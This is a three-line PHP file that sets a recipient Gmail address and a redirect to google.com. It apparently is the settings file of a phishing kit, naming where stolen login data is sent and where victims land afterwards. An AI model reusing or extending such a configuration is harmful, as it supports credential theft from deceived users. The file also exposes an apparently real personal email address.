<?php 
$Receive_email="jametolu667@gmail.com";
$redirect="https://www.google.com/";
?>